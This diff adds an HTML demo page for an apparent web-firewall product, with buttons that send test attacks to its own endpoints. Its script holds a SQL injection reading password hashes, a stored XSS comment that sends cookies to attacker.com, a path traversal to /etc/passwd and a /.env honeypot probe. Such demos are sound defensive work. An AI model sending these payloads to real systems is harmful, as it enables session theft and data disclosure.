@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Nexus CyberStore — Protected App Lab</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap">
+  <style>
+    :root {
+      --bg: #090d16;
+      --surface: #131b2e;
+      --surface2: #1c263f;
+      --border: #283655;
+      --text: #f1f5f9;
+      --muted: #94a3b8;
+      --primary: #38bdf8;
+      --success: #22c55e;
+      --danger: #ef4444;
+      --warning: #f59e0b;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Inter', system-ui, sans-serif;
+      padding: 32px 20px;
+    }
+    .container { max-width: 1080px; margin: 0 auto; }
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding-bottom: 24px;
+      border-bottom: 1px solid var(--border);
+      margin-bottom: 28px;
+    }
+    .brand { display: flex; align-items: center; gap: 12px; }
+    .logo-badge {
+      background: #0284c7;
+      color: white;
+      padding: 8px 12px;
+      border-radius: 8px;
+      font-weight: 700;
+      font-size: 18px;
+    }
+    .title { font-size: 20px; font-weight: 700; }
+    .subtitle { font-size: 13px; color: var(--muted); }
+    .shield-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 6px 12px;
+      background: rgba(34, 197, 94, 0.12);
+      border: 1px solid var(--success);
+      color: var(--success);
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 600;
+    }
+    .grid { display: grid; grid-template-columns: 1.2fr 1fr; gap: 24px; }
+    .card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 20px;
+    }
+    .card-title {
+      font-size: 15px;
+      font-weight: 600;
+      margin-bottom: 14px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .test-btn-group { display: flex; flex-direction: column; gap: 10px; }
+    .test-btn {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 12px 16px;
+      border-radius: 8px;
+      border: 1px solid var(--border);
+      background: var(--surface2);
+      color: var(--text);
+      cursor: pointer;
+      text-align: left;
+      transition: all 0.15s ease;
+      font-size: 13px;
+    }
+    .test-btn:hover {
+      border-color: var(--primary);
+      transform: translateY(-1px);
+    }
+    .test-btn .badge-pill {
+      padding: 3px 8px;
+      border-radius: 4px;
+      font-size: 11px;
+      font-weight: 600;
+      font-family: 'JetBrains Mono', monospace;
+    }
+    .pill-clean { background: rgba(34,197,94,0.15); color: var(--success); }
+    .pill-attack { background: rgba(239,68,68,0.15); color: var(--danger); }
+    .pill-honeypot { background: rgba(168,85,247,0.15); color: #c084fc; }
+
+    pre.response-box {
+      background: #060911;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 14px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+      color: #38bdf8;
+      overflow-x: auto;
+      min-height: 240px;
+      max-height: 380px;
+    }
+    .status-badge {
+      display: inline-block;
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-size: 12px;
+      font-weight: 700;
+      margin-bottom: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <div class="brand">
+        <div class="logo-badge">🛒 NEXUS</div>
+        <div>
+          <div class="title">Nexus CyberStore Portal</div>
+          <div class="subtitle">Protected Target Application Lab (Demo Environment)</div>
+        </div>
+      </div>
+      <div class="shield-badge">
+        <span>🛡️</span> Protected by AI Cyber Guardian SDK
+      </div>
+    </div>
+
+    <div class="grid">
+      <!-- Left Column: Attack Simulation Controls -->
+      <div>
+        <div class="card">
+          <div class="card-title">
+            <span>🧪</span> Interactive Security Test Suite
+          </div>
+          <p style="font-size: 12px; color: var(--muted); margin-bottom: 14px;">
+            Click below to fire authentic requests against this application. Watch the Guardian intercept threats before application logic executes:
+          </p>
+          <div class="test-btn-group">
+            <button class="test-btn" onclick="runTest('clean_search')">
+              <div>
+                <strong>1. Legitimate Search</strong>
+                <div style="font-size: 11px; color: var(--muted); font-family: monospace;">GET /api/catalog/search?q=router</div>
+              </div>
+              <span class="badge-pill pill-clean">200 ALLOW</span>
+            </button>
+
+            <button class="test-btn" onclick="runTest('sqli_search')">
+              <div>
+                <strong>2. SQL Injection Attack</strong>
+                <div style="font-size: 11px; color: var(--muted); font-family: monospace;">GET /api/catalog/search?q=1' UNION SELECT...</div>
+              </div>
+              <span class="badge-pill pill-attack">403 BLOCK</span>
+            </button>
+
+            <button class="test-btn" onclick="runTest('xss_review')">
+              <div>
+                <strong>3. Stored XSS Script Payload</strong>
+                <div style="font-size: 11px; color: var(--muted); font-family: monospace;">POST /api/reviews (comment=&lt;script&gt;)</div>
+              </div>
+              <span class="badge-pill pill-attack">403 BLOCK</span>
+            </button>
+
+            <button class="test-btn" onclick="runTest('path_traversal')">
+              <div>
+                <strong>4. Path Traversal / LFI Exploit</strong>
+                <div style="font-size: 11px; color: var(--muted); font-family: monospace;">GET /api/files/view?doc=../../../../etc/passwd</div>
+              </div>
+              <span class="badge-pill pill-attack">403 BLOCK</span>
+            </button>
+
+            <button class="test-btn" onclick="runTest('decoy_lure')">
+              <div>
+                <strong>5. Decoy Surface Probe (.env / Canary)</strong>
+                <div style="font-size: 11px; color: var(--muted); font-family: monospace;">GET /.env (Attacker trapped in Honeypot)</div>
+              </div>
+              <span class="badge-pill pill-honeypot">HONEYPOT</span>
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Right Column: Live Target App Response Output -->
+      <div>
+        <div class="card">
+          <div class="card-title" style="justify-content: space-between;">
+            <div style="display: flex; align-items: center; gap: 8px;">
+              <span>📡</span> Target Application Response
+            </div>
+            <span id="timing-badge" style="font-size: 11px; color: var(--muted); font-family: monospace;">Ready</span>
+          </div>
+          <div id="status-pill" class="status-badge" style="background: var(--surface2); color: var(--muted);">WAITING FOR TRIGGER</div>
+          <pre id="response-output" class="response-box">// Select any test on the left to fire a request through the Guardian SDK.</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    async function runTest(type) {
+      const output = document.getElementById('response-output');
+      const statusPill = document.getElementById('status-pill');
+      const timingBadge = document.getElementById('timing-badge');
+
+      output.textContent = 'Dispatching request through Guardian SDK...';
+      const t0 = performance.now();
+
+      try {
+        let res, data;
+        if (type === 'clean_search') {
+          res = await fetch('/api/catalog/search?q=router');
+          data = await res.json();
+        } else if (type === 'sqli_search') {
+          res = await fetch("/api/catalog/search?q=' UNION SELECT 1,2,password_hash FROM users--");
+          data = await res.json();
+        } else if (type === 'xss_review') {
+          res = await fetch('/api/reviews', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              product_id: 101,
+              author: "Attacker",
+              comment: "<script>fetch('http://attacker.com/steal?c='+document.cookie)<\\/script>"
+            })
+          });
+          data = await res.json();
+        } else if (type === 'path_traversal') {
+          res = await fetch('/api/files/view?doc=../../../../etc/passwd');
+          data = res.headers.get('content-type')?.includes('json') ? await res.json() : await res.text();
+        } else if (type === 'decoy_lure') {
+          res = await fetch('/.env');
+          data = await res.text();
+        }
+
+        const t1 = performance.now();
+        timingBadge.textContent = `${Math.round(t1 - t0)}ms latency`;
+
+        if (res.status === 200) {
+          statusPill.style.background = 'rgba(34, 197, 94, 0.2)';
+          statusPill.style.color = '#22c55e';
+          statusPill.textContent = type === 'decoy_lure' ? '200 OK (TRAPPED IN HONEYPOT)' : '200 OK (PASSED TO APP)';
+        } else if (res.status === 403) {
+          statusPill.style.background = 'rgba(239, 68, 68, 0.2)';
+          statusPill.style.color = '#ef4444';
+          statusPill.textContent = '403 FORBIDDEN (BLOCKED BY WAF SHIELD)';
+        } else {
+          statusPill.style.background = 'rgba(245, 158, 11, 0.2)';
+          statusPill.style.color = '#f59e0b';
+          statusPill.textContent = `${res.status} RESPONSE`;
+        }
+
+        output.textContent = typeof data === 'object' ? JSON.stringify(data, null, 2) : String(data);
+      } catch (err) {
+        statusPill.style.background = 'rgba(239, 68, 68, 0.2)';
+        statusPill.style.color = '#ef4444';
+        statusPill.textContent = 'ERROR';
+        output.textContent = `Error connecting to target app: ${err.message}`;
+      }
+    }
+  </script>
+</body>
+</html>
